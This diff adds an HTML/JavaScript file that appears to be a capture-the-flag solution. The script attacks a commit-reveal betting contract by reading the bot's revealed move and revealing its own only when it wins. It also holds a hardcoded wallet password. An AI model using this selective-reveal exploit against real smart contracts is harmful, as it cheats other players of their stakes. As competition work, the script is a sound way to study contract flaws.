@@ -1,0 +1,130 @@
+<html>
+<head>
+
+<script src="https://cdn.socket.io/socket.io-1.4.5.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+
+var CHOOSE_FUNCTION = '0x7460c747';
+var REVEAL_FUNCTION = '0x80c06d70';
+var PLAY_FUNCTION   = '0x93e84cd9';
+
+var NOT_PLAYING     = 0;
+var PLAYING         = 1;
+var REVEALED 		= 2;
+var CURRENT_STATUS  = NOT_PLAYING;
+
+var OUR_OPTION      = 0;
+//hex encoded 'Vt37gM30Z;/(2oM{j^p(+y.ynNCK/=ws'
+//randstr(32); //we don't care too much of our security because the bot is supposedly stupid and wouldn't listen us >:)
+var OUR_NONCE 		= '0x56743337674d33305a3b2f28326f4d7b6a5e70282b792e796e4e434b2f3d7773'; 
+//i was to lazy to import web3-utils into this, you bassically need to call utils.soliditySha3
+//require('./job').get_options('0x6C9f3cf65Ede2CecdF6F31f785B9A664E2ebF526'.toLowerCase(),'Vt37gM30Z;/(2oM{j^p(+y.ynNCK/=ws')
+var OUR_COMMITS     = JSON.parse('[null,"0x1de280cb49c7895a387cc2fd7b1d54962838d6329f7b6ded63289561ebb81271","0x5d627d8aeb6e211589af2c0f60563f990ad847bb214ed3350a097f899f47c034","0x8d8aa116cb276cbd9cef6e750ffbb14742e1418fc92e15877345977c2bebe1d4","0x76ba61b495366258d8dcc6a94bc197c583d17a773aa1895df982724146392765","0xfc9f3f104eb4c329e8eab1be4e17a00d9a40018e130fd4a8cc6a8cbf3b1b1345"]');
+
+var client;
+var myaddress       = '0x6C9f3cf65Ede2CecdF6F31f785B9A664E2ebF526'.toLowerCase();
+var mypassword      = 'testam';
+var mytarget        = '0x114E61f93C6e48906Bd33c3510CB5A16FB59F552'.toLowerCase();
+
+var winners = [
+	[0,0,0,0,0,0],
+	[0,0,2,1,2,1],
+	[0,1,0,2,1,2],
+	[0,2,1,0,2,1],
+	[0,1,2,1,0,2],
+	[0,2,1,2,1,0]
+];
+
+var command_params = {
+					function:'call_contract',
+					abi: '[{"constant":true,"inputs":[],"name":"totalinvested","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"solvedHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"bot","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalplayers","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"minbet","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_commit","type":"bytes32"}],"name":"choose","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"_option","type":"uint8"},{"name":"_nonce","type":"bytes"}],"name":"reveal","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"triesHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"play","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"hasShowed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"reset","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_minbet","type":"uint256"},{"name":"_bot","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]',
+					address: mytarget,
+					from: myaddress,
+					password: mypassword,
+					func:null,
+					params:null,
+					value:'10000000000000',
+					type:'standard',
+					gas:'2500000',
+					gasPrice: 0};
+
+function randstr(length) {
+    var text = "";
+    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()_+{}:\"|<>?/.,;'\\][=-]";
+    for(var i = 0; i < length; i++) {
+        text += possible.charAt(Math.floor(Math.random() * possible.length));
+    }
+    return text;
+}
+
+
+$(document).ready(function() {
+	client = io.connect('http://108.61.178.190:8080');
+
+	client.on('transaction', function(data) {
+		console.log('transaction', data, data.from, myaddress);
+
+		if(CURRENT_STATUS == NOT_PLAYING &&  //not playing
+			data.from.toLowerCase() != myaddress.toLowerCase() && //not me
+			data.input.indexOf(CHOOSE_FUNCTION) !== -1 //if the bot played something
+			) {
+			console.log('The bot is playing something.');
+			OUR_OPTION = Math.floor((Math.random() * 5) + 1);
+			//OUR_COMMIT = web3.utils.soliditySha3({t:'address', v: myaddress}, {t:'uint8', v: OUR_OPTION}, OUR_NONCE);
+
+			console.log('Sending commit option: ', OUR_OPTION);
+			
+			command_params.func   = 'choose';
+			command_params.params = JSON.stringify([OUR_COMMITS[OUR_OPTION]]);
+			command_params.value  = '10000000000000';
+			
+			CURRENT_STATUS = PLAYING;
+
+			$.post('https://omegas.dctf-f1nals-2017.def.camp', command_params, function(data) {
+				console.log(data);
+			});
+		} else if(CURRENT_STATUS == PLAYING && 
+			data.from.toLowerCase() != myaddress.toLowerCase() && //not me
+			data.input.indexOf(REVEAL_FUNCTION) !== -1 //if the bot revealed something
+			) {
+			CURRENT_STATUS = REVEALED;
+			//input in blockchain is: sha3 of the function (first 8chars) + 256 bits for each param and we only 
+			//care of the first param which is bot's options
+			var player2_option = 1*data.input[REVEAL_FUNCTION.length + 63]; 
+			console.log('The bot revealed his option', player2_option);
+			if(winners[player2_option][OUR_OPTION] == 2) {//if our solution is winning
+				console.log('For options ', player2_option, OUR_OPTION, ' we won.');
+				command_params.func   = 'reveal';
+				command_params.params = JSON.stringify([OUR_OPTION, OUR_NONCE]);
+				command_params.value  = '0';
+				
+				$.post('https://omegas.dctf-f1nals-2017.def.camp', command_params, function(data) {
+					console.log(data);
+				});
+			} else {
+				console.log('For options ', player2_option, OUR_OPTION, ' we lost.');
+				//do nothing and wait for the owner to restart the game for not revealing
+			}
+		} else if(data.from.toLowerCase() != myaddress.toLowerCase() && //not me
+			data.input.indexOf(PLAY_FUNCTION) !== -1 //if play was hit 
+			) {
+			console.log('Game finished.');
+			CURRENT_STATUS = NOT_PLAYING;
+			OUR_OPTION     = 0;
+		} else {
+			//do nothing
+		}
+	});
+
+	client.on('connect', function() {
+		console.log('connected');
+		client.emit('listen_for', mytarget);
+	});
+});
+</script>
+
+</head>
+<body>
+</body>
+</html>
